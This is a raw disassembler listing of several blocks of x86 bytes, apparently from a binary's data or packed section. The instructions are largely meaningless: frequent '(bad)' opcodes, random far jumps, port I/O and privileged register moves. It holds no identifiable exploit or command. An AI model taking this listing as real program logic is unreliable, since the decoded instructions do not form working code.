  418013:	rcr    DWORD PTR [esi+eiz*8+0x2d513f39],cl
  41801a:	ror    BYTE PTR ss:[edx+0x31],0xd3
  41801f:	adc    ah,BYTE PTR [ebp+0x73024aa8]
  418025:	aaa    
  418026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418027:	pop    ds
  418028:	popf   
  418029:	aad    0xe7
  41802b:	fwait
  41802c:	sub    eax,0x3c0c8dca
  418031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418032:	jecxz  0x4180a8
  418034:	mov    ecx,0x5ebd594e
  418039:	test   DWORD PTR ds:0x864759d1,0x4af6d824
  418043:	add    al,0xb5
  418045:	lahf   
  418046:	(bad)
  418049:	or     al,0x9d
  41804b:	out    dx,al
  41804c:	fwait
  41804d:	mov    eax,0x5f0d5254
  418052:	leavew 
  418054:	je     0x41802d
  418056:	inc    edx
  418057:	pusha  
  418058:	or     DWORD PTR [esi],ebp
  41805a:	lea    ebx,[ebx]
  41805c:	out    0x7a,eax
  41805e:	(bad)  
  41805f:	sbb    eax,esi
  418061:	xchg   ebx,eax
  418062:	call   0x326a8907
  418067:	inc    eax
  418068:	pop    edx
  418069:	mov    ss,WORD PTR [ecx-0x7e7244b8]
  41806f:	sbb    DWORD PTR [esp+ecx*1-0x68],0x16fb6fce
  418077:	cld    
  418078:	jb     0x4180c0
  41807a:	ins    DWORD PTR es:[edi],dx
  41807b:	fistp  QWORD PTR [ebp*1-0x64ddcc8e]
  418082:	fist   DWORD PTR [eax]
  418084:	or     eax,0x667b2524
  418089:	mov    edi,0x25baad85
  41808e:	(bad)  
  41808f:	sbb    BYTE PTR [eax-0x362b61b9],dh
  418095:	cmp    al,0x17
  418097:	fisubr DWORD PTR [esi+esi*4-0x4b6da89c]
  41809e:	mov    BYTE PTR [ebx-0x43],cl
  4180a1:	shl    DWORD PTR [esi+edx*4+0x2534fb2d],0xfa
  4180a9:	arpl   cx,di
  4180ab:	cmp    dh,dh
  4180ad:	pop    esi
  4180ae:	pop    edi
  4180af:	dec    esi
  4180b0:	rcl    BYTE PTR [eax-0x1e],0x29
  4180b4:	mov    ch,0xb
  4180b7:	adc    al,0x76
  4180b9:	or     DWORD PTR [edi],edx
  4180bb:	arpl   WORD PTR [esi+ecx*1+0xc],di
  4180bf:	cwde   
  4180c0:	fwait
  4180c1:	cld    
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	leave  
  418141:	push   ds
  418142:	in     eax,dx
  418143:	jns    0x41817d
  418145:	push   es
  418146:	add    DWORD PTR [eax],eax
  418148:	test   BYTE PTR [eax],0x0
  41814b:	add    BYTE PTR [edi+0x1],al
  41814e:	xor    al,0xe0
  418150:	or     ch,cl
  418152:	mov    al,ds:0xcdcd678c
  418157:	test   edi,esi
  418159:	mov    eax,0x87f2759c
  41815e:	icebp  
  41815f:	cmp    dh,BYTE PTR [edi]
  418161:	aaa    
  418162:	jo     0x4181bc
  418164:	or     ah,BYTE PTR [ecx]
  418166:	cmp    ebp,DWORD PTR [esp+edi*8+0x28c6b870]
  41816d:	jmp    eax
  41816f:	sub    ecx,DWORD PTR [esi+0x1e8c86aa]
  418175:	mov    ds:0xb6fc52fd,al
  41817a:	out    dx,al
  41817b:	out    dx,al
  41817c:	xor    esp,DWORD PTR [edx-0x714be3df]
  418182:	(bad)  
  418183:	outs   dx,BYTE PTR ds:[esi]
  418184:	(bad)  
  418185:	jmp    0xada185e5
  41818a:	les    esi,FWORD PTR [ebx]
  41818c:	shl    DWORD PTR [edi-0x23],cl
  41818f:	xor    ebp,DWORD PTR [ebx+0x4b]
  418192:	sub    al,0x99
  418194:	xor    BYTE PTR [edi-0x31],al
  418197:	xor    BYTE PTR cs:[ecx-0x5d546fd4],ah
  41819e:	pcmpgtd mm7,QWORD PTR [edx]
  4181a1:	push   0x74
  4181a3:	shr    al,1
  4181a5:	mov    dl,0x68
  4181a7:	mov    dl,0x3b
  4181a9:	mov    ebp,0x3708668d
  4181ae:	aad    0xb1
  4181b0:	sbb    cl,BYTE PTR [eax]
  4181b2:	repz jno 0x418144
  4181b5:	ja     0x4181b1
  4181b7:	mov    cs,WORD PTR [ebx+0x50ae5b34]
  4181bd:	xchg   ebp,eax
  4181be:	sub    BYTE PTR [esi-0x407e57e2],dl
  4181c4:	(bad)  
  4181c6:	cmp    ecx,edx
  4181c8:	cmp    BYTE PTR [ecx+0x1c],bl
  4181cb:	mov    bl,0x97
  4181cd:	popf   
  4181ce:	pop    esi
  4181cf:	add    BYTE PTR [ecx+0x36],0xdb
  4181d3:	in     eax,0xfb
  4181d5:	(bad)  
  4181d6:	in     al,0xbd
  4181d8:	test   al,0x58
  4181da:	xchg   edi,eax
  4181db:	pop    edi
  4181dc:	inc    esi
  4181dd:	mov    al,ds:0xaf4a9cd8
  4181e2:	mov    DWORD PTR [eax],edx
  4181e4:	iret   
  4181e5:	sub    esi,DWORD PTR [edi-0x9]
  4181e8:	sbb    edx,ebx
  4181ea:	imul   esp,DWORD PTR ds:0x149b740,0x903743b5
  4181f4:	xchg   esp,eax
  4181f5:	inc    ebp
  4181f6:	mov    ebp,es
  4181f8:	add    DWORD PTR [esi-0x32],eax
  4181fb:	addr16 jno 0x4181e3
  4181fe:	and    al,0x7a
  418200:	(bad)  
  418202:	and    al,0xd6
  418204:	inc    edx
  418205:	daa    
  418206:	push   ecx
  418207:	mov    DWORD PTR [ecx-0x40f68234],esp
  41820d:	imul   ebx,DWORD PTR [esi+0x64bf7d12],0x3de46169
  418217:	(bad)  
  418218:	fstp   DWORD PTR [esi]
  41821a:	pop    ss
  41821b:	inc    DWORD PTR [ebx-0x36]
  41821e:	jne    0x41820c
  418220:	add    ebx,DWORD PTR [edx-0x634a06f3]
  418226:	adc    ebp,esp
  418228:	sbb    ebp,ebp
  41822a:	pushf  
  41822b:	ret    
  41822c:	xchg   esp,eax
  41822d:	mov    ch,0xb9
  41822f:	xchg   ebx,eax
  418230:	push   ecx
  418231:	sbb    DWORD PTR [eax],ebx
  418233:	xchg   ecx,eax
  418234:	pop    esi
  418235:	jb     0x418216
  418237:	push   cs
  418238:	(bad)  
  418239:	test   BYTE PTR [eax],0xcf
  41823c:	inc    esi
  41823d:	or     ch,BYTE PTR [ebx*8+0x9943]
	...
  4182b4:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x3ef3ecbf
  4182bf:	adc    DWORD PTR [ebx+0x2e1c31b3],esp
  4182c5:	pop    es
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	test   BYTE PTR [eax],0x0
  4182cb:	add    BYTE PTR [esi],dh
  4182cd:	xchg   ecx,eax
  4182ce:	inc    edx
  4182cf:	call   0x2420:0x4b868d5d
  4182d6:	int3   
  4182d7:	jb     0x4182e2
  4182d9:	ret    0xfbeb
  4182dc:	aaa    
  4182dd:	stos   BYTE PTR es:[edi],al
  4182de:	jae    0x4182d9
  4182e0:	lods   eax,DWORD PTR ds:[esi]
  4182e1:	cs mov ebx,0x8d7bd237
  4182e7:	xchg   esp,eax
  4182e8:	ss lahf 
  4182ea:	mov    DWORD PTR [esi],edx
  4182ec:	int3   
  4182ed:	sahf   
  4182ee:	xchg   ecx,eax
  4182ef:	sbb    al,0x58
  4182f1:	(bad)  
  4182f2:	sub    BYTE PTR [edi],bh
  4182f4:	js     0x4182e2
  4182f6:	cmp    BYTE PTR [eax-0x55],0x50
  4182fa:	mov    eax,0xcf275487
  4182ff:	mov    edi,0x3798f232
  418304:	xchg   DWORD PTR [edi+0x5c],ebp
  418307:	dec    BYTE PTR [esi+ebx*8]
  41830a:	jmp    0x63809539
  41830f:	lods   eax,DWORD PTR ds:[esi]
  418310:	xchg   edi,eax
  418311:	lods   al,BYTE PTR ds:[esi]
  418312:	push   ebp
  418313:	or     edx,DWORD PTR [eax*2-0x4d859733]
  41831a:	push   es
  41831b:	or     eax,ecx
  41831d:	push   eax
  41831e:	adc    al,0x2c
  418320:	(bad)  
  418321:	pop    ecx
  418322:	scas   al,BYTE PTR es:[edi]
  418323:	pop    ss
  418324:	jle    0x4183a5
  418326:	xchg   esp,eax
  418327:	mov    edx,0x51b40362
  41832c:	iret   
  41832d:	in     eax,0x47
  41832f:	bound  esi,QWORD PTR [ebp+0x34]
  418332:	dec    esi
  418333:	inc    eax
  418334:	mov    ecx,0x3d41eb92
  418339:	aad    0xa
  41833b:	in     al,0x61
  41833d:	out    0xcd,al
  41833f:	jecxz  0x4183b5
  418341:	or     BYTE PTR [edi+0x2],al
  418344:	test   DWORD PTR [ebx],edx
  418346:	into   
  418347:	cmc    
  418348:	cld    
  418349:	push   ss
  41834a:	fistp  QWORD PTR [eax]
  41834c:	add    al,0xfd
  41834e:	add    al,0x3
  418350:	pop    es
  418351:	sbb    eax,0xc6203388
  418356:	sbb    BYTE PTR [edx],bh
  418358:	stc    
  418359:	fild   DWORD PTR [edx-0x23bf2072]
  41835f:	xchg   esp,eax
  418360:	pop    ebx
  418361:	mov    al,ds:0x4c2d0095
  418366:	mov    ebp,cs
  418368:	in     al,0xf0
  41836a:	sbb    al,0x80
  41836c:	cwde   
  41836d:	lea    eax,[edx+0x2]
  418370:	adc    BYTE PTR [edi],0x20
  418373:	jne    0x4183f4
  418375:	and    al,0xc5
  418377:	mov    eax,ds:0xac76848f
  41837c:	test   al,0xa9
  41837e:	and    al,0xba
  418380:	stos   BYTE PTR es:[edi],al
  418381:	ins    BYTE PTR es:[edi],dx
  418382:	adc    DWORD PTR [ecx],esi
  418384:	dec    esp
  418385:	xor    DWORD PTR [ecx],eax
  418387:	lds    esi,FWORD PTR [ebx+edi*1]
  41838a:	mov    al,ds:0x1250aba2
  41838f:	enter  0xd140,0x90
  418393:	sub    BYTE PTR [esi+0x403b5a2e],cl
  418399:	(bad)  
  41839b:	fild   DWORD PTR [edx+eax*1]
  41839e:	cmp    edi,DWORD PTR [edi-0x1d968e32]
  4183a4:	push   edi
  4183a5:	inc    ebx
  4183a6:	jl     0x4183a6
  4183a8:	cld    
  4183a9:	out    dx,al
  4183aa:	adc    BYTE PTR [ebx+0x7d90b97c],0xaf
  4183b1:	(bad)  
  4183b2:	shl    BYTE PTR [eax-0x996fae4],cl
  4183b8:	(bad)  
  4183b9:	xor    DWORD PTR [ecx+edx*1-0x652d113b],eax
  4183c0:	pop    esp
  4183c1:	inc    ebx
	...
  418432:	add    BYTE PTR [eax],al
  418434:	xchg   ecx,eax
  418435:	mov    edx,0xdc6b0c6a
  41843a:	idiv   DWORD PTR [edi-0x233270d3]
  418440:	in     al,0x14
  418442:	cmp    cl,bh
  418444:	and    al,0x8
  418446:	add    DWORD PTR [eax],eax
  418448:	test   BYTE PTR [eax],0x0
  41844b:	add    bl,bl
  41844d:	lods   eax,DWORD PTR ds:[esi]
  41844e:	inc    edx
  41844f:	dec    ebp
  418450:	or     edx,ebp
  418452:	shl    DWORD PTR [ebx-0x2e],0xa5
  418456:	or     al,0xda
  418458:	int3   
  418459:	ror    cl,1
  41845b:	pop    es
  41845c:	call   0xfe8ca7d3
  418461:	bound  esp,QWORD PTR [esi-0x7d]
  418464:	xchg   esp,eax
  418465:	in     eax,0xb7
  418467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418468:	stos   BYTE PTR es:[edi],al
  418469:	dec    ebp
  41846a:	xor    BYTE PTR [edi+0x0],al
  41846d:	test   DWORD PTR [edx],esi
  41846f:	dec    esi
  418470:	inc    ecx
  418471:	and    DWORD PTR [eax+0x36],esi
  418474:	jns    0x418429
  418476:	jge    0x418423
  418478:	jo     0x41845e
  41847a:	adc    cl,BYTE PTR [ebp+ebp*1-0x70]
  41847e:	xchg   esi,eax
  41847f:	push   ebp
  418480:	push   ecx
  418481:	out    dx,eax
  418482:	fsubr  st,st(6)
  418484:	repz mov ds:0xca8345c9,al
  41848a:	sbb    al,BYTE PTR [edx-0x7da3d496]
  418490:	push   ss
  418491:	(bad)  
  418492:	adc    eax,0xcbc77d4f
  418497:	cdq    
  418498:	push   0xf9da691d
  41849d:	inc    ecx
  41849e:	fmul   st,st(6)
  4184a0:	xchg   ecx,eax
  4184a1:	lods   eax,DWORD PTR ds:[esi]
  4184a2:	xchg   BYTE PTR [esi+0x2e34321e],dh
  4184a8:	std    
  4184a9:	jecxz  0x418430
  4184ab:	mov    gs,WORD PTR [ecx+0x7]
  4184ae:	mov    WORD PTR [esi+0x26],?
  4184b1:	pop    ebx
  4184b2:	scas   eax,DWORD PTR es:[edi]
  4184b3:	mov    bh,0xbd
  4184b5:	xlat   BYTE PTR ds:[ebx]
  4184b6:	leave  
  4184b7:	or     ah,BYTE PTR [edi-0x4c]
  4184ba:	cmp    BYTE PTR ds:0xb7a8569b,cl
  4184c0:	lahf   
  4184c1:	dec    esi
  4184c2:	test   eax,0xf0ada31d
  4184c7:	or     ecx,DWORD PTR [eax+0x6f]
  4184ca:	push   eax
  4184cb:	(bad)  
  4184cc:	(bad)
  4184cf:	mov    ds:0x7ac72d10,eax
  4184d4:	(bad)  
  4184d5:	popa   
  4184d6:	mov    eax,DWORD PTR [edi+0x5]
  4184d9:	push   edx
  4184da:	fs push eax
  4184dc:	enter  0xfc91,0x40
  4184e0:	cli    
  4184e1:	sar    DWORD PTR [esi+0x23],1
  4184e4:	or     eax,0x479b3328
  4184e9:	fldcw  WORD PTR [eax-0x69374cce]
  4184ef:	es popa 
  4184f1:	adc    esi,esp
  4184f3:	add    al,0x6e
  4184f5:	cs arpl cx,dx
  4184f8:	add    ch,dh
  4184fa:	cmp    edi,edx
  4184fc:	mov    al,0x82
  4184fe:	lods   al,BYTE PTR ds:[esi]
  4184ff:	push   edi
  418500:	clc    
  418501:	outs   dx,BYTE PTR ds:[esi]
  418502:	fild   WORD PTR [edi]
  418504:	jne    0x4184e6
  418506:	mov    esp,0xf32d0f38
  41850b:	adc    ch,BYTE PTR [eax]
  41850d:	loope  0x4184fc
  41850f:	sbb    al,0xf1
  418511:	jns    0x418551
  418513:	dec    edx
  418514:	push   ds
  418515:	sahf   
  418516:	lds    eax,FWORD PTR [ebp-0x52]
  418519:	push   ebp
  41851a:	daa    
  41851b:	xor    ah,BYTE PTR [ebx]
  41851d:	test   ch,al
  41851f:	push   0x3e03989c
  418524:	mov    ebp,0x639e71cd
  418529:	(bad)  
  41852a:	std    
  41852b:	add    dh,BYTE PTR [ecx+0x29a7752a]
  418531:	(bad)  
  418532:	mov    eax,0x799dbd00
  418537:	dec    ebx
  418538:	jge    0x418560
  41853a:	loop   0x4184d9
  41853c:	outs   dx,DWORD PTR ds:[esi]
  41853d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41853e:	xchg   ebp,eax
  41853f:	(bad)  
  418540:	xor    DWORD PTR [ecx+0x0],esp
	...
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	call   0x1b242646
  4185c5:	or     DWORD PTR [ecx],eax
  4185c7:	add    dh,dh
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [ecx+0x5039bccc],al
  4185d1:	fmul   st,st(1)
  4185d3:	inc    edi
  4185d4:	sub    BYTE PTR [eax+ebx*4+0x1d96eb83],bl
  4185db:	xor    BYTE PTR [bp+si-0x388e],0x19
  4185e1:	inc    DWORD PTR [esi-0xd0d9292]
  4185e7:	call   0x4d043a5
  4185ec:	ficom  WORD PTR [ebp+ebx*8-0x78]
  4185f0:	test   al,0x41
  4185f2:	xchg   BYTE PTR [ecx],cl
  4185f4:	mov    dh,0xec
  4185f6:	and    esp,DWORD PTR ds:0x37aeec9a
  4185fc:	mov    DWORD PTR [ebx],esi
  4185fe:	popa   
  4185ff:	ins    BYTE PTR es:[edi],dx
  418600:	push   edx
  418601:	mov    bl,0x80
  418603:	aas    
  418604:	mov    eax,ds:0xf4197fe2
  418609:	fild   DWORD PTR [ecx-0x73e9d577]
  41860f:	pop    ecx
  418610:	dec    eax
  418611:	jmp    0x418604
  418613:	push   ds
  418614:	retf   0x4087
  418617:	cmp    ebp,DWORD PTR [esi]
  418619:	lahf   
  41861a:	push   eax
  41861b:	mov    BYTE PTR [eax],bh
  41861d:	push   ss
  41861e:	cdq    
  41861f:	mov    ebx,0xd951b26d
  418624:	sbb    eax,0xaf19407f
  418629:	xchg   ebp,eax
  41862a:	and    eax,0xc53b92de
  41862f:	fstp   st(2)
  418631:	xchg   esp,eax
  418632:	mov    esp,0xf1fc61cd
  418637:	bound  ebp,QWORD PTR [eax-0x99edc3f]
  41863d:	push   edi
  41863e:	nop
  41863f:	out    dx,al
  418640:	lods   eax,DWORD PTR ds:[esi]
  418641:	(bad)  
  418642:	and    eax,0x835372db
  418647:	inc    eax
  418648:	mov    eax,0xae945717
  41864d:	cmp    al,0x42
  41864f:	pop    eax
  418650:	rcr    DWORD PTR [edi+0x69508beb],0xe1
  418657:	xor    DWORD PTR [ebx+ebp*4-0x13],ebp
  41865b:	add    cl,BYTE PTR [ebx+0x65]
  41865e:	xchg   edx,eax
  41865f:	jae    0x418694
  418661:	and    edx,DWORD PTR [ecx-0x1343f9ae]
  418667:	mov    ch,0xcf
  418669:	jg     0x41863d
  41866b:	adc    al,0x1a
  41866d:	sub    BYTE PTR [eax],ah
  41866f:	mov    db7,ebx
  418672:	lods   eax,DWORD PTR ds:[esi]
  418673:	test   DWORD PTR [edi-0x2b],eax
  418676:	or     BYTE PTR [ecx+ecx*8],cl
  418679:	adc    al,0xa8
  41867b:	enter  0xdf25,0xee
  41867f:	push   ebp
  418680:	push   cs
  418681:	add    ch,cl
  418683:	sub    eax,0x7240eb81
  418688:	enter  0x55a7,0xa
  41868c:	lods   al,BYTE PTR ds:[esi]
  41868d:	sbb    al,0xf
  41868f:	std    
  418690:	inc    edx
  418691:	pusha  
  418692:	mov    cl,0x1
  418694:	out    dx,eax
  418695:	in     eax,0x14
  418697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418698:	out    0xf2,al
  41869a:	jecxz  0x418635
  41869c:	gs into 
  41869e:	out    0xb3,eax
  4186a0:	leave  
  4186a1:	push   esp
  4186a2:	(bad)  
  4186a3:	jmp    0x6f7:0x680ae783
  4186aa:	jp     0x4186e3
  4186ac:	dec    ebx
  4186ad:	push   edx
  4186ae:	push   ecx
  4186af:	scas   al,BYTE PTR es:[edi]
  4186b0:	xchg   DWORD PTR [ebp+0x6c],ecx
  4186b3:	add    eax,0x2ffee953
  4186b8:	push   0xffffffea
  4186ba:	jno    0x418642
  4186bc:	jo     0x418725
  4186be:	inc    eax
  4186bf:	(bad)  
  4186c0:	sar    DWORD PTR [edi+0x0],1
	...
  418732:	add    BYTE PTR [eax],al
  418734:	jmp    0xff598547
  418739:	imul   ecx
  41873b:	(bad)  
  41873c:	pop    ds
  41873d:	sub    ah,0x2b
  418740:	sahf   
  418741:	xor    ch,bh
  418743:	bound  edx,QWORD PTR [eax]
  418745:	or     al,BYTE PTR [ecx]
  418747:	add    dh,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    bl,dh
  41874d:	mov    ch,0xeb
  41874f:	or     DWORD PTR [ecx-0x4eb7e0fb],esp
  418755:	dec    edx
  418756:	push   edx
  418757:	pop    esp
  418758:	jg     0x418796
  41875a:	lods   al,BYTE PTR ds:[esi]
  41875b:	and    DWORD PTR [ebp-0x1da7d9a4],ebx
  418761:	ja     0x418701
  418763:	jae    0x41877c
  418765:	jmp    0x123a32fb
  41876a:	or     BYTE PTR [esp+ecx*8],cl
  41876d:	cs sub ecx,ecx
  418770:	jmp    0xc5a64f29
  418775:	int    0x2d
  418777:	push   ebp
  418778:	nop
  418779:	ss cs gs je 0x4187c6
  41877e:	push   ebx
  41877f:	dec    edx
  418780:	js     0x4187c2
  418782:	call   FWORD PTR [edx+eax*2-0x3098275c]
  418789:	adc    al,0x3
  41878b:	js     0x41879f
  41878d:	mov    esi,0x9fd71f1d
  418792:	pop    esi
  418793:	cld    
  418794:	rcr    DWORD PTR [eax+0xd2571f3],1
  41879a:	jnp    0x418815
  41879c:	jo     0x418755
  41879e:	into   
  41879f:	les    ecx,FWORD PTR [edx-0x19f64ffd]
  4187a5:	pop    edi
  4187a6:	or     DWORD PTR [ebp-0x2717d1e3],ebp
  4187ac:	cmp    al,0x6e
  4187ae:	fisubr WORD PTR [ebp-0x78]
  4187b1:	jmp    0x41881d
  4187b3:	lea    edi,[esi+edi*8-0x5aca79aa]
  4187ba:	shr    BYTE PTR [eax-0x34725129],0xe1
  4187c1:	jecxz  0x418786
  4187c3:	fild   QWORD PTR [ecx]
  4187c5:	sub    al,0xbe
  4187c7:	out    0x88,al
  4187c9:	call   0x50c8d01
  4187ce:	mov    DWORD PTR [edx],esi
  4187d0:	pop    edx
  4187d1:	cmp    al,0x79
  4187d3:	lock inc edx
  4187d5:	sbb    al,0xf6
  4187d7:	inc    esp
  4187d8:	or     DWORD PTR [ebx-0x20a4980c],ebp
  4187de:	lods   al,BYTE PTR ds:[esi]
  4187df:	je     0x41882a
  4187e1:	add    al,0x26
  4187e3:	add    esp,esi
  4187e5:	pop    eax
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	fld    DWORD PTR [ebp+edx*4-0x3e]
  4187eb:	fcom   st(1)
  4187ed:	daa    
  4187ee:	lea    ecx,[ebp-0x14]
  4187f1:	add    al,0x88
  4187f3:	sub    DWORD PTR [edx],edx
  4187f5:	aam    0xc0
  4187f7:	outs   dx,DWORD PTR ds:[esi]
  4187f8:	push   ss
  4187f9:	ja     0x4187ed
  4187fb:	pop    eax
  4187fc:	pop    esi
  4187fd:	sub    DWORD PTR [eax],ecx
  4187ff:	inc    esi
  418800:	and    BYTE PTR [edx-0x3f],cl
  418803:	jmp    0x2ce0797
  418808:	jae    0x4187e7
  41880a:	jmp    0x784a:0x830683c2
  418811:	(bad)
  418815:	aad    0x30
  418817:	push   ebx
  418818:	cmp    ebp,eax
  41881a:	out    0x6c,al
  41881c:	jae    0x4187b4
  41881e:	jmp    0x5289:0x63eb45be
  418825:	and    ebp,edi
  418827:	loop   0x418816
  418829:	enter  0x79eb,0x3c
  41882d:	push   edi
  41882e:	dec    eax
  41882f:	mov    ah,0x2d
  418831:	pusha  
  418832:	push   eax
  418833:	adc    dh,BYTE PTR [ecx-0x6d]
  418836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418837:	and    esp,esp
  418839:	and    al,0xa8
  41883b:	in     eax,dx
  41883c:	dec    ebp
  41883d:	jns    0x4187e1
  41883f:	outs   dx,DWORD PTR ds:[esi]
  418840:	add    cl,BYTE PTR [edx+0x0]
	...
  4188b3:	add    BYTE PTR [eax+0x41],bl
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xd83e8432,al
  4188c3:	pop    es
  4188c4:	push   es
  4188c5:	or     eax,DWORD PTR [ecx]
  4188c7:	add    dh,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [esi+0x32],al
  4188ce:	mov    ebx,DWORD PTR [edi]
  4188d0:	sub    esi,DWORD PTR [ecx+edi*1]
  4188d3:	jb     0x418938
  4188d5:	sub    BYTE PTR [edx],dl
  4188d7:	shl    DWORD PTR [eax+0x3eac5f07],0x3
  4188de:	stc    
  4188df:	sbb    bl,BYTE PTR [ecx-0x20]
  4188e2:	dec    ecx
  4188e3:	jge    0x4188bd
  4188e5:	cld    
  4188e6:	xchg   edx,eax
  4188e7:	in     eax,dx
  4188e8:	outs   dx,BYTE PTR ds:[esi]
  4188e9:	or     al,0xc5
  4188eb:	adc    BYTE PTR [ebp-0x33],ch
  4188ee:	xchg   ebx,eax
  4188ef:	dec    edi
  4188f0:	sub    al,0xab
  4188f2:	mov    al,0xef
  4188f4:	lea    edi,[ebx]
  4188f6:	repz je 0x418946
  4188f9:	aad    0x16
  4188fb:	add    DWORD PTR [ebp+0x565533cf],edi
  418901:	add    DWORD PTR [esi-0x6fcb2f39],esp
  418907:	adc    al,0xac
  418909:	push   ebp
  41890a:	rcl    BYTE PTR [ecx+0x2f15d63b],cl
  418910:	or     bh,BYTE PTR [ebx]
  418912:	cs in  eax,dx
  418914:	mov    eax,0xf095d6ab
  418919:	push   cs
  41891a:	pop    edx
  41891b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41891c:	(bad)  
  41891d:	xlat   BYTE PTR ds:[ebx]
  41891e:	cdq    
  41891f:	mov    ebp,0x6c6c8d63
  418924:	xlat   BYTE PTR ds:[ebx]
  418925:	mov    BYTE PTR [edx-0x5c1e9df],0x36
  41892c:	iret   
  41892d:	mov    eax,ds:0x3068c769
  418932:	xor    dh,BYTE PTR [ebp+0x3e]
  418935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418936:	out    0x85,al
  418938:	(bad)  
  41893b:	dec    edx
  41893c:	mov    ebx,edx
  41893e:	lods   al,BYTE PTR ds:[esi]
  41893f:	xchg   BYTE PTR [edi+0x67d784aa],bl
  418945:	in     eax,dx
  418946:	scas   al,BYTE PTR es:[edi]
  418947:	scas   eax,DWORD PTR es:[edi]
  418948:	mov    eax,ds:0x270e9a51
  41894d:	sbb    esi,DWORD PTR [ecx]
  41894f:	stos   DWORD PTR es:[edi],eax
  418950:	iret   
  418951:	mov    edx,DWORD PTR [edi]
  418953:	sub    BYTE PTR [edi+0x6030b435],dl
  418959:	sbb    cl,ah
  41895b:	jmp    0x87e1909
  418960:	jmp    0x418901
  418962:	or     dh,BYTE PTR [edi+eax*4-0x57f9680a]
  418969:	mov    bh,0x34
  41896b:	xor    DWORD PTR [ecx],esp
  41896d:	xchg   edx,eax
  41896e:	(bad)  
  41896f:	dec    ecx
  418970:	xchg   DWORD PTR [ebx+edi*4],ebp
  418973:	cmp    eax,0x1a28b23e
  418978:	pop    edx
  418979:	rcl    BYTE PTR [ecx+eiz*8-0x73192255],0x36
  418981:	sub    DWORD PTR ds:[esp+esi*2],esi
  418985:	in     al,dx
  418986:	add    BYTE PTR [edx-0x842c43],bh
  41898c:	pop    ebx
  41898d:	pop    ss
  41898e:	or     eax,0x57d7c7ca
  418993:	inc    ecx
  418994:	xchg   bh,cl
  418996:	adc    dl,BYTE PTR [edx+0x63]
  418999:	in     al,0x6d
  41899b:	int    0x3
  41899d:	int3   
  41899e:	inc    edx
  41899f:	inc    ebp
  4189a0:	mov    ecx,DWORD PTR [esi]
  4189a2:	aam    0x97
  4189a4:	push   0x67
  4189a6:	je     0x41892b
  4189a8:	or     DWORD PTR [eax-0x45],eax
  4189ab:	push   DWORD PTR [eax]
  4189ad:	or     al,0xc8
  4189af:	outs   dx,BYTE PTR ds:[esi]
  4189b0:	jecxz  0x41899d
  4189b2:	fs jns 0x41897f
  4189b5:	cld    
  4189b6:	mov    al,0xd2
  4189b8:	jecxz  0x418a19
  4189ba:	jb     0x418987
  4189bc:	jmp    0x130e7e61
  4189c1:	mov    es,WORD PTR [eax]
	...
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	push   0xb
  418a42:	jne    0x418aad
  418a44:	cld    
  418a45:	or     eax,DWORD PTR [ecx]
  418a47:	add    dh,dh
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [eax+eax*2],ch
  418a4e:	sbb    DWORD PTR [edi],esi
  418a50:	call   0xb43:0x2eadbd06
  418a57:	mov    edi,0xcfac31e0
  418a5c:	int3   
  418a5d:	inc    edi
  418a5e:	push   eax
  418a5f:	fld    DWORD PTR [edi+0x62]
  418a62:	xchg   DWORD PTR [edi],ecx
  418a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a65:	add    DWORD PTR [eax+0x40],esp
  418a68:	or     al,0x80
  418a6a:	fxch   st(4)
  418a6c:	fnstcw WORD PTR [esi]
  418a6e:	sub    eax,0xcd87d9c1
  418a73:	xor    al,0xb9
  418a75:	addr16 bswap esp
  418a78:	in     al,dx
  418a79:	call   0x361f609e
  418a7e:	fidivr DWORD PTR [ebx+0x34]
  418a81:	xchg   esp,eax
  418a82:	pop    ebx
  418a83:	bound  ecx,QWORD PTR [edx]
  418a85:	jp     0x418a6b
  418a87:	jne    0x418a39
  418a89:	(bad)  
  418a8a:	sub    eax,DWORD PTR cs:[ebx-0x7bb11bdf]
  418a91:	sar    edx,0xac
  418a94:	inc    eax
  418a95:	jle    0x418ad5
  418a97:	mov    ah,0x1
  418a99:	retf   0x79bc
  418a9c:	hlt    
  418a9d:	shl    BYTE PTR [esi+ecx*8+0x7f],1
  418aa1:	dec    eax
  418aa2:	mov    dl,0xb7
  418aa4:	xor    bl,BYTE PTR [ecx-0x4b]
  418aa7:	ret    0x82e6
  418aaa:	add    ah,BYTE PTR ds:0x97a50c75
  418ab0:	aad    0xc4
  418ab2:	dec    esp
  418ab3:	aas    
  418ab4:	rcr    BYTE PTR [eax],0x5d
  418ab7:	gs push es
  418ab9:	dec    ebp
  418aba:	mov    ecx,0x7b890e15
  418abf:	xor    BYTE PTR [eax+0x1c],bh
  418ac2:	jb     0x418b27
